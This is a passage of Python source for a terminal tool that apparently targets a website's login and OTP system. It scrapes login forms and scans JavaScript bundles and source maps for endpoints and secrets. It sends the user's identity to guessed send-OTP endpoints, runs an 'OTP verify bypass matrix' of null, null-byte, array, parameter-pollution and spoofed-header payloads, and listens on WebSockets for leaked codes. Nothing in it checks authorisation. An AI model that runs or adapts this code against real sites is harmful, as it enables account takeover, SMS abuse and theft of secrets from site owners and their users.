        r = self.sess.req("GET", self.target)
        print_request("GET / (baseline)", "GET", self.target, self.sess.s.headers)
        print_response("GET / (baseline)", r)
        if r is None:
            print(f"{ALERT}✗ Target unreachable{RESET}")
            stage_footer(CYBER)
            return False
        self.discovered["html"] = r.text
        self.discovered["origins"].add(urlparse(self.target).netloc)
        self.discovered["login_page_url"] = r.url
        analyze_headers(r, self.log, "(login page)")
        soup = BeautifulSoup(r.text, "lxml")

        forms = soup.find_all("form")
        login_forms = []
        for f in forms:
            inputs = [(inp.get("name"), (inp.get("type") or "text").lower(),
                       inp.get("value") or "")
                      for inp in f.find_all("input") if inp.get("name")]
            names = [n.lower() for n, _, _ in inputs]
            types = [t for _, t, _ in inputs]
            if ("password" in types or "email" in types or "tel" in types
                or any(k in " ".join(names) for k in ("email","phone","mobile","user","login","identifier"))
                or any(k in " ".join(names) for k in ("otp","code","pin"))):
                login_forms.append({"form": f, "inputs": inputs})

        csrf_names = {"csrf","csrf_token","_token","authenticity_token",
                      "csrfmiddlewaretoken","__requestverificationtoken","xsrf"}

        if login_forms:
            print(f"\n  {B}{BR}◈ LOGIN / OTP FORMS DETECTED ({len(login_forms)}){RESET}")
            for i, lf in enumerate(login_forms, 1):
                f = lf["form"]
                action = f.get("action") or self.target
                if not action.startswith("http"):
                    action = urljoin(self.target + "/", action)
                method = (f.get("method") or "GET").upper()
                has_csrf = any(n and n.lower() in csrf_names for n, _, _ in lf["inputs"])
                print(f"\n    {BR}Form #{i}{RESET}  {'✓ CSRF' if has_csrf else '⚠ no CSRF'}")
                print(f"      {B}Action :{RESET} {action}")
                print(f"      {B}Method :{RESET} {method}")
                print(f"      {B}Inputs :{RESET}")
                for n, t, v in lf["inputs"]:
                    print(f"        {DIM}- name={n}  type={t}  value={v[:40] if v else ''}{RESET}")
                self.discovered["forms"].append({"action": action, "method": method,
                                                 "inputs": lf["inputs"], "csrf": has_csrf})
                if not has_csrf and method == "POST":
                    self.log.add("csrf", "medium", f"Login form without CSRF token: {action}",
                                 "POST form has no CSRF field",
                                 safe_json(lf["inputs"])[:1000], confidence=0.7)

            for a in soup.find_all("a", href=True):
                href = a["href"].lower()
                if any(k in href for k in ("login", "signin", "sign-in", "auth")):
                    page_url = urljoin(self.target + "/", a["href"])
                    print(f"\n  {C}[*] Following login link: {page_url}{RESET}")
                    r2 = self.sess.req("GET", page_url)
                    if r2 and r2.status_code < 400:
                        self.discovered["login_page_url"] = r2.url
                        self.discovered["html"] += "\n" + r2.text
                        analyze_headers(r2, self.log, "(login link)")
                        soup2 = BeautifulSoup(r2.text, "lxml")
                        for f in soup2.find_all("form"):
                            inputs = [(inp.get("name"), (inp.get("type") or "text").lower(),
                                       inp.get("value") or "")
                                      for inp in f.find_all("input") if inp.get("name")]
                            action = f.get("action") or page_url
                            if not action.startswith("http"):
                                action = urljoin(page_url + "/", action)
                            has_csrf = any(n and n.lower() in csrf_names for n, _, _ in inputs)
                            self.discovered["forms"].append({
                                "action": action,
                                "method": (f.get("method") or "GET").upper(),
                                "inputs": inputs, "csrf": has_csrf})
                    break
        else:
            print(f"\n  {Y}No traditional form — site is likely a JavaScript SPA.{RESET}")
        stage_footer(CYBER)
        return True

    def harvest_js(self):
        stage_header("STAGE 2", "JS BUNDLE + SOURCE MAP HARVESTING — Deep analysis", PLASMA)
        soup = BeautifulSoup(self.discovered["html"] or "", "lxml")
        js_urls = set(); inline = []
        for tag in soup.find_all("script"):
            if tag.get("src"):
                js_urls.add(urljoin(self.target + "/", tag["src"]))
            elif tag.string and len(tag.string) > 50:
                inline.append(tag.string)
        for link in soup.find_all("link", rel=True):
            rel = " ".join(link.get("rel", [])).lower()
            href = link.get("href", "")
            if href.endswith(".js") or "module" in rel or "preload" in rel:
                js_urls.add(urljoin(self.target + "/", href))
        for m in re.finditer(r'https?://[A-Za-z0-9\.\-]+/[A-Za-z0-9_\-./]+\.js',
                             self.discovered["html"]):
            js_urls.add(m.group(0))

        print(f"  {C}JS bundles: {len(js_urls)}   Inline scripts: {len(inline)}{RESET}")

        def analyze_one(url):
            r = self.sess.req("GET", url)
            if r is None or r.status_code != 200: return
            js = r.text
            eps = set(); ws = set(); apis = set()
            for m in API_RE.finditer(js): eps.add(m.group(1))
            for m in URL_RE.finditer(js):
                u = m.group(0)
                if any(k in u.lower() for k in ("api","otp","auth","sms","verify","login")):
                    eps.add(u); apis.add(urlparse(u).netloc)
            for m in WS_RE.finditer(js): ws.add(m.group(0))
            with self.log.lock:
                self.discovered["endpoints"] |= eps
                self.discovered["ws"] |= ws
                self.discovered["api_hosts"] |= apis
                self.discovered["scripts"].add(url)
            secrets = find_secrets(js)
            if secrets:
                self.log.add("js-secret", "high", f"Secrets in JS: {url}",
                             safe_json(secrets)[:400], js[:5000], extra=secrets,
                             confidence=0.9)
            providers = find_sms(js)
            if providers:
                print(f"  {GOLD}[SMS/CHANNEL]{RESET} {url} → {providers}")
            mr = self.sess.req("GET", url + ".map")
            if mr and mr.status_code == 200:
                print(f"  {LASER}[MAP]{RESET} source map recovered: {url}.map")
                try:
                    data = mr.json()
                except Exception:
                    data = None
                if data:
                    for c in (data.get("sourcesContent") or []):
                        if not c: continue
                        for m in API_RE.finditer(c):
                            self.discovered["endpoints"].add(m.group(1))
                        for m in URL_RE.finditer(c):
                            u = m.group(0)
                            if any(k in u.lower() for k in ("api","otp","auth","sms","verify")):
                                self.discovered["endpoints"].add(u)
                        s = find_secrets(c)
                        if s:
                            self.log.add("map-secret", "high",
                                         f"Secrets in source map for {url}",
                                         safe_json(s)[:400], c[:5000], extra=s,
                                         confidence=0.9)

        if js_urls:
            with ThreadPoolExecutor(max_workers=8) as ex:
                futs = [ex.submit(analyze_one, u) for u in js_urls]
                for f in as_completed(futs): f.result()

        for i, s in enumerate(inline[:10], 1):
            for m in API_RE.finditer(s): self.discovered["endpoints"].add(m.group(1))
            for m in URL_RE.finditer(s):
                u = m.group(0)
                if any(k in u.lower() for k in ("api","otp","auth","sms","verify")):
                    self.discovered["endpoints"].add(u)
            for m in WS_RE.finditer(s): self.discovered["ws"].add(m.group(0))
            sct = find_secrets(s)
            if sct:
                self.log.add("inline-secret", "high", f"Secrets in inline script #{i}",
                             safe_json(sct)[:400], s[:3000], extra=sct, confidence=0.9)

        sec = find_secrets(self.discovered["html"])
        if sec:
            self.log.add("html-secret", "critical", "Secrets in index.html",
                         safe_json(sec)[:400], self.discovered["html"], extra=sec,
                         confidence=0.95)

        print(f"\n  {B}Total endpoints discovered: {len(self.discovered['endpoints'])}{RESET}")
        for e in sorted(self.discovered["endpoints"])[:40]:
            print(f"    {DIM}→ {e}{RESET}")
        stage_footer(PLASMA)

    def prompt_credentials(self):
        stage_header("STAGE 3", "CREDENTIAL INPUT — Establishing identity", GOLD)
        print(f"{C}The tool needs your login identity to run the OTP flow.{RESET}\n")
        while True:
            ident = prompt(f"{GOLD}{BR}[?] Enter Gmail address or phone number (full E.164 like +8801234567890): {RESET}")
            if not ident:
                print(f"  {R}Cannot be empty{RESET}"); continue
            if "@" in ident and "." in ident.split("@")[-1]:
                self.identity = ident; self.is_email = True; break
            digits = re.sub(r'[^\d+]', '', ident)
            if ident.startswith("+"):
                if len(digits) >= 8:
                    self.identity = ident; self.is_email = False
                    self._guess_country_from_dial(ident)
                    break
                print(f"  {R}Invalid E.164 number — must start with + and country code{RESET}"); continue
            built = build_phone_number()
            if not built:
                continue
            full, name, code, dial = built
            self.identity = full
            self.country_name = name
            self.country_code = code
            self.dial_code = dial
            self.is_email = False
            break
        try:
            self.password = getpass.getpass(f"{GOLD}{BR}[?] Enter password (blank if OTP-only): {RESET}")
        except KeyboardInterrupt:
            raise RestartSignal()
        except EOFError:
            self.password = ""
        print(f"  {LASER}✓ Identity: {BR}{self.identity}{RESET} ({'email' if self.is_email else 'phone'})")
        if not self.is_email and self.country_name:
            print(f"  {LASER}✓ Country : {BR}{self.country_name} ({self.country_code}){RESET} {DIM}{self.dial_code}{RESET}")
        if self.password: print(f"  {LASER}✓ Password: set{RESET}")
        else: print(f"  {Y}• Password: not set{RESET}")
        stage_footer(GOLD)

    def _guess_country_from_dial(self, e164):
        best = None
        for code, name, dial in COUNTRIES:
            if e164.startswith(dial):
                if best is None or len(dial) > len(best[2]):
                    best = (code, name, dial)
        if best:
            self.country_code, self.country_name, self.dial_code = best

    def _identity_payload(self, extra=None):
        base = {}
        if self.is_email:
            base.update({"email": self.identity, "identifier": self.identity,
                         "username": self.identity, "login": self.identity})
        else:
            base.update({"phone": self.identity, "mobile": self.identity,
                         "msisdn": self.identity, "number": self.identity,
                         "identifier": self.identity, "phoneNumber": self.identity})
        if self.password:
            base.update({"password": self.password, "pass": self.password})
        if extra: base.update(extra)
        return base

    def submit_login_form(self):
        stage_header("STAGE 4", "SUBMITTING LOGIN / OTP REQUEST — Triggering flow", CYBER)
        if not self.discovered["forms"]:
            print(f"  {Y}No form to submit — will test discovered endpoints instead{RESET}")
            stage_footer(CYBER)
            return
        for i, form in enumerate(self.discovered["forms"], 1):
            action = form["action"]; method = form["method"]; inputs = form["inputs"]
            data = {}
            for name, typ, val in inputs:
                low = name.lower()
                if typ == "password": data[name] = self.password or "Password123!"
                elif typ == "hidden": data[name] = val
                elif typ == "email" or "email" in low:
                    data[name] = self.identity if self.is_email else "test@example.com"
                elif typ == "tel" or any(k in low for k in ("phone","mobile","msisdn","number")):
                    data[name] = self.identity if not self.is_email else "+15551234567"
                elif any(k in low for k in ("otp","code","pin")): data[name] = "000000"
                elif any(k in low for k in ("user","login","identifier","account")):
                    data[name] = self.identity
                else: data[name] = self.identity
            print(f"\n  {B}{BR}◈ Form #{i}: {method} {action}{RESET}")
            baseline = self.conf.baseline(action, method,
                                          json=data if method == "POST" else None,
                                          params=None if method == "POST" else data)
            r = (self.sess.req(method, action, json=data) if method == "POST"
                 else self.sess.req("GET", action, params=data))
            self._sleep()
            print_request(f"form#{i}", method, action, self.sess.s.headers, data)
            print_response(f"form#{i}", r,
                           find_otps(r.text if r else ""),
                           find_sms(r.text if r else ""),
                           find_secrets(r.text if r else ""))
            if r is None: continue
            analyze_headers(r, self.log, f"(form#{i})")
            verdict, conf, reason = self.conf.classify(r, baseline)
            otps = find_otps(r.text or "")
            if otps:
                confirmed = self.conf.confirm_otp_leak(
                    r.text, action, method="POST" if method == "POST" else "GET",
                    body_obj=data if method == "POST" else None)
                if confirmed:
                    self.log.add("form-otp", "critical",
                                 f"OTP leaked in form response from {action}",
                                 f"OTPs={sorted(confirmed)} verdict={verdict}",
                                 r.text, extra={"endpoint": action,
                                                "otps": sorted(confirmed)},
                                 confidence=conf)
                else:
                    print(f"    {Y}⚠ OTP-like strings not reproducible — suppressed (anti-FP){RESET}")
        stage_footer(CYBER)

    def probe_login_endpoints(self):
        stage_header("STAGE 5", "LOGIN / SEND-OTP ENDPOINT PROBING — Surface discovery", PLASMA)
        candidates = set()
        for ep in self.discovered["endpoints"]:
            low = ep.lower()
            if any(k in low for k in ("login","signin","sign-in","otp","send",
                                       "verify","auth","resend","sms","call","register")):
                candidates.add(ep)
        for guess in ("/login", "/signin", "/api/login", "/api/auth/login",
                      "/api/otp/send", "/api/otp/verify", "/api/auth/otp/send",
                      "/api/auth/otp/verify", "/send-otp", "/verify-otp",
                      "/api/v1/otp/send", "/api/v1/otp/verify", "/api/v1/auth/otp",
                      "/api/sms/send", "/api/otp/resend", "/api/auth/send-otp",
                      "/api/auth/signin", "/auth/otp", "/api/user/login"):
            candidates.add(guess)

        print(f"  {C}Testing {len(candidates)} candidates with identity {BR}{self.identity}{RESET}")
        for ep in sorted(candidates):
            url = ep if ep.startswith("http") else urljoin(self.target + "/", ep.lstrip("/"))
            body = self._identity_payload()
            for method in ("POST", "GET"):
                kw = {"json": body} if method == "POST" else {"params": body}
                baseline = self.conf.baseline(url, method, **kw)
                r = self.sess.req(method, url, **kw)
                self._sleep()
                if r is None or r.status_code == 404 or r.status_code >= 500:
                    continue
                otps = find_otps(r.text)
                sms = find_sms(r.text)
                verdict, conf, reason = self.conf.classify(r, baseline)
                if r.status_code < 400 or otps or sms or verdict != "unknown":
                    print_request(f"{method} {url}", method, url, self.sess.s.headers, body)
                    print_response(f"{method} {url}", r, otps, sms, find_secrets(r.text))
                    analyze_headers(r, self.log, f"({method} {url})")
                    if otps:
                        confirmed = self.conf.confirm_otp_leak(
                            r.text, url, method=method,
                            body_obj=body if method == "POST" else None)
                        if confirmed:
                            self.log.add("endpoint-otp", "critical",
                                         f"OTP leaked from {url}",
                                         f"OTPs={sorted(confirmed)} method={method}",
                                         r.text,
                                         extra={"endpoint": url,
                                                "otps": sorted(confirmed)},
                                         confidence=conf)
                        else:
                            print(f"    {Y}⚠ OTP strings not reproducible — suppressed{RESET}")
                    if sms and verdict == "success":
                        self.log.add("channel", "info",
                                     f"SMS/voice channel confirmed at {url}",
                                     f"{sms} verdict={verdict}", r.text,
                                     confidence=conf)
                break
        stage_footer(PLASMA)

    def trace_sender_receiver(self):
        stage_header("STAGE 6", "SENDER / RECEIVER / CHANNEL VALIDATION — Delivery analysis", GOLD)
        send_eps = [e for e in self.discovered["endpoints"]
                    if any(k in e.lower() for k in ("send","otp","sms","call","resend"))]
        if not send_eps:
            send_eps = ["/api/otp/send", "/api/auth/otp/send", "/send-otp",
                        "/api/v1/otp/send", "/api/sms/send", "/api/otp/resend"]
        for ep in send_eps[:12]:
            url = ep if ep.startswith("http") else urljoin(self.target + "/", ep.lstrip("/"))
            body = self._identity_payload()
            baseline = self.conf.baseline(url, "POST", json=body)
            r = self.sess.req("POST", url, json=body)
            self._sleep()
            if r is None or r.status_code >= 500: continue
            print_request(f"send-otp {url}", "POST", url, self.sess.s.headers, body)
            print_response(f"send-otp {url}", r, find_otps(r.text), find_sms(r.text),
                           find_secrets(r.text))
            analyze_headers(r, self.log, f"(send {url})")
            verdict, conf, reason = self.conf.classify(r, baseline)
            txt = r.text or ""
            otps = find_otps(txt)
            if otps:
                confirmed = self.conf.confirm_otp_leak(txt, url, method="POST",
                                                       body_obj=body)
                sender = r.headers.get("From") or r.headers.get("Sender") or "n/a"
                provider = find_sms(txt) or "n/a"
                print(f"\n    {PLASMA}{BR}◈ DELIVERY ANALYSIS{RESET}")
                print(f"      {B}Receiver :{RESET} {self.identity}")
                print(f"      {B}Country  :{RESET} {self.country_name or 'n/a'} ({self.country_code or 'n/a'}) {self.dial_code or ''}")
                print(f"      {B}Sender   :{RESET} {sender}")
                print(f"      {B}Channel  :{RESET} {provider}")
                print(f"      {B}OTP value:{RESET} {BR}{sorted(confirmed or otps)}{RESET}")
                print(f"      {B}Endpoint :{RESET} {url}")
                print(f"      {B}Verdict  :{RESET} {verdict} ({reason}, conf={conf:.2f})")
                if confirmed:
                    self.log.add("delivery-leak", "critical",
                                 f"OTP visible in send-response from {url}",
                                 f"Receiver={self.identity} Country={self.country_code} "
                                 f"OTPs={sorted(confirmed)} Channel={provider} Sender={sender}",
                                 txt,
                                 extra={"receiver": self.identity,
                                        "country": self.country_code,
                                        "dial": self.dial_code,
                                        "sender": sender,
                                        "channel": provider, "otps": sorted(confirmed),
                                        "endpoint": url}, confidence=conf)
        stage_footer(GOLD)

    def bypass_verify(self):
        stage_header("STAGE 7", "OTP VERIFY BYPASS MATRIX — Exploitation testing", ALERT)
        verify_eps = [e for e in self.discovered["endpoints"]
                      if any(k in e.lower() for k in ("verify","validate","check","confirm"))]
        if not verify_eps:
            verify_eps = ["/api/otp/verify", "/verify-otp", "/api/auth/otp/verify"]

        payloads = [
            ("empty", ""), ("null", None), ("zero", 0), ("true", True),
            ("neg", -1), ("overflow", 99999999999), ("nullbyte", "000000\x00"),
            ("star", "*"), ("spaces", "      "), ("array", ["000000"]),
            ("object", {"v": "000000"}), ("hpp", "000000&otp=111111"),
            ("baseline", "123456"),
        ]
        header_variants = [
            ("baseline", {}),
            ("xff", {"X-Forwarded-For": "127.0.0.1", "X-Originating-IP": "127.0.0.1"}),
            ("debug", {"X-Debug": "1", "X-Requested-With": "XMLHttpRequest"}),
        ]
        for ep in verify_eps[:5]:
            url = ep if ep.startswith("http") else urljoin(self.target + "/", ep.lstrip("/"))
            bl_body = self._identity_payload({"otp": "BOGUS000"})
            bl_r = self.sess.req("POST", url, json=bl_body)
            bl_state = bl_r.status_code if bl_r else None
            bl_text = (bl_r.text or "") if bl_r else ""
            print(f"\n  {C}Baseline failure sample at {url} → {bl_state}{RESET}")

            for plabel, pval in payloads:
                for hv, hh in header_variants:
                    body = self._identity_payload({"otp": pval})
                    r = self.sess.req("POST", url, json=body, headers=hh)
                    self._sleep()
                    if r is None: continue
                    verdict, conf, reason = self.conf.classify(r)
                    differs = (r.status_code != bl_state or
                               self.conf.body_differs(r.text, bl_text))
                    col = LASER if (verdict == "success" and differs) else (ALERT if verdict == "failure" else Y)
                    print(f"  {col}{verdict:8s}{RESET} {plabel:10s}/{hv:8s} {url} → {r.status_code} "
                          f"(differs={differs}, conf={conf:.2f})")
                    if verdict == "success" and differs and conf >= 0.6:
                        print_request(f"{plabel}/{hv} {url}", "POST", url, hh, body)
                        print_response(f"{plabel}/{hv} {url}", r,
                                       find_otps(r.text), find_sms(r.text),
                                       find_secrets(r.text))
                        self.log.add("bypass", "critical",
                                     f"OTP bypass confirmed ({plabel}/{hv}) at {url}",
                                     f"Baseline status={bl_state}; bypass status={r.status_code}; "
                                     f"reason={reason}",
                                     r.text,
                                     extra={"endpoint": url, "payload": plabel,
                                            "headers": hv}, confidence=conf)
        stage_footer(ALERT)

    def observe_websockets(self, duration=10):
        if websocket is None:
            print(f"\n{Y}[*] websocket-client not installed, skipping{RESET}"); return
        if not self.discovered["ws"]:
            print(f"\n{Y}[*] No WebSockets discovered{RESET}"); return
        stage_header("STAGE 8", "WEBSOCKET CHANNEL OBSERVATION — Live traffic", PLASMA)
        for url in list(self.discovered["ws"])[:3]:
            print(f"\n  {B}{BR}◈ {url}{RESET}")
            try:
                hdrs = [f"{k}: {v}" for k, v in self.sess.s.headers.items()]
                ws = websocket.create_connection(url, timeout=5, header=hdrs)
                try:
                    ws.send(json.dumps({"action": "subscribe", "identifier": self.identity,
                                        "email": self.identity, "phone": self.identity}))
                except Exception:
                    pass
                end = time.time() + duration
                while time.time() < end:
                    try:
                        msg = ws.recv()
                    except Exception:
                        break
                    if not msg: continue
                    print(f"    {C}frame:{RESET} {msg[:300]}")
                    otps = find_otps(msg)
                    if otps:
                        self.log.add("ws-leak", "critical",
                                     f"OTP in WebSocket frame from {url}",
                                     str(sorted(otps)), msg,
                                     extra={"endpoint": url, "otps": sorted(otps)},
                                     confidence=0.9)
                ws.close()
            except Exception as e:
                print(f"    {ALERT}✗ {e}{RESET}")
        stage_footer(PLASMA)

    def report(self, out_dir="otp_reports"):
        os.makedirs(out_dir, exist_ok=True)
        stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        summary = {"target": self.target, "identity": self.identity,
                   "identity_type": "email" if self.is_email else "phone",
                   "country": {"name": self.country_name, "code": self.country_code,
                               "dial": self.dial_code} if not self.is_email else None,
                   "ts": datetime.utcnow().isoformat()+"Z",
                   "discovered": {"scripts": sorted(self.discovered["scripts"]),
                                  "endpoints": sorted(self.discovered["endpoints"]),
                                  "websockets": sorted(self.discovered["ws"]),
                                  "api_hosts": sorted(self.discovered["api_hosts"]),
                                  "origins": sorted(self.discovered["origins"])},
                   "http_history_count": len(self.sess.history),
                   "findings": self.log.findings}
        jp = os.path.join(out_dir, f"report_{stamp}.json")
        with open(jp, "w") as f: json.dump(summary, f, indent=2, default=str)

        hp = os.path.join(out_dir, f"raw_http_{stamp}.txt")
        with open(hp, "w") as f:
            for i, h in enumerate(self.sess.history, 1):
                f.write(f"\n===== EXCHANGE {i} ({h['ts']}) =====\n")
                if "error" in h:
                    f.write(f"ERROR: {h['error']}\n")
                    continue
                f.write(raw_http_req(h.get("method","?"), h.get("url","?"),
                                     h.get("req_headers",{}), h.get("req_body")) + "\n\n")
                f.write(raw_http_resp_from_hist(h) + "\n\n")

        mp = os.path.join(out_dir, f"report_{stamp}.md")
        with open(mp, "w") as f:
            f.write(f"# OTP Assessment\n\nTarget: `{self.target}`  \nIdentity: `{self.identity}`  \n")
            if not self.is_email and self.country_name:
                f.write(f"Country: `{self.country_name} ({self.country_code}) {self.dial_code}`  \n")
            f.write(f"Requests captured: {len(self.sess.history)}\n\n")
            f.write("## Discovered Surface\n\n")
            for k, v in summary["discovered"].items():
                f.write(f"### {k} ({len(v)})\n\n")
                for item in v[:50]: f.write(f"- `{item}`\n")
                f.write("\n")
            f.write("## Findings\n\n")
            rank = {"critical":0,"high":1,"medium":2,"low":3,"info":4}
            for fnd in sorted(self.log.findings, key=lambda x: rank.get(x["severity"], 5)):
                f.write(f"### [{fnd['severity'].upper()}] {fnd['title']}  \n")
                f.write(f"*Confidence: {fnd.get('confidence', 1.0)}*\n\n")
                f.write(f"- Kind: `{fnd['kind']}`\n- Detail: {fnd['detail']}\n\n")
                if fnd["evidence"]:
                    f.write(f"```\n{fnd['evidence'][:1500]}\n```\n\n")

        w = term_width()
        print()
        print(f"{LASER}{BR}{framed_top('◈ REPORT GENERATED SUCCESSFULLY ◈', LASER, w)}{RESET}")
        print(framed_line(f"{G}JSON :{RESET} {jp}", LASER, w))
        print(framed_line(f"{G}MD   :{RESET} {mp}", LASER, w))
        print(framed_line(f"{G}RAW  :{RESET} {hp}", LASER, w))
        print(f"{LASER}{BR}{framed_bottom(LASER, w)}{RESET}")
        sev = Counter(f["severity"] for f in self.log.findings)
        print(f"\n{GOLD}{BR}◈ TOTAL FINDINGS: {len(self.log.findings)}{RESET}")
        for k in ("critical","high","medium","low","info"):
            if sev.get(k):
                col = ALERT if k in ("critical","high") else Y if k == "medium" else C
                print(f"    {col}▸ {k.upper()}: {sev[k]}{RESET}")
        print()

def wait_for_target():
    stage_header("TARGET ACQUISITION", "Enter target site URL to begin assessment", GOLD)
    while True:
        target = prompt(f"\n{GOLD}{BR}◈ [ TARGET URL ] ► {RESET}")
        if not target:
            print(f"  {R}Cannot be empty{RESET}"); continue
        if not target.startswith(("http://", "https://")):
            target = "https://" + target
        host = urlparse(target).hostname or ""
        if not host:
            print(f"  {R}Invalid URL{RESET}"); continue
        break
    stage_footer(GOLD)
    return target

def main():
    clear_screen()
    cinematic_transition("INITIALIZING SESSION-X ENGINE", PLASMA)
    cinematic_transition("SECURE CHANNEL ESTABLISHED", LASER)

    if not gateway():
        sys.exit(0)

    clear_screen()
    banner()

    target = wait_for_target()
    h = Hunter(target, delay=0.3)

    try:
        if not h.find_login_page():
            sys.exit(1)
        h.harvest_js()
        h.prompt_credentials()
        h.submit_login_form()
        h.probe_login_endpoints()
        h.trace_sender_receiver()
        h.bypass_verify()
        h.observe_websockets()
    except KeyboardInterrupt:
        print(f"\n{Y}[!] Interrupted — writing partial report{RESET}")

    h.report("otp_reports")
    h._final_summary()

    w = term_width()
    print(f"\n{NEON}{BR}{framed_top('', NEON, w)}{RESET}")
    print(framed_line(f"{GOLD}{SXB}{'[X] ASSESSMENT COMPLETE'.center(term_width() - 4)}{RESET}", NEON, w))
    print(f"{NEON}{BR}{framed_bottom(NEON, w)}{RESET}\n")

if __name__ == "__main__":
    while True:
        try:
            main()
            break
        except RestartSignal:
            print(f"\n{CYBER}{BR}[↻] Restarting session...{RESET}\n")
            time.sleep(0.5)
            continue
        except KeyboardInterrupt:
            print(f"\n{ALERT}{BR}  ✗ Session terminated by user. Exiting...{RESET}\n")
            sys.exit(0)
        except Exception as e:
            print(f"\n{ALERT}{BR}  ✗ Critical error: {e}{RESET}")
            print(f"{Y}  Restarting session...{RESET}\n")
            time.sleep(1)
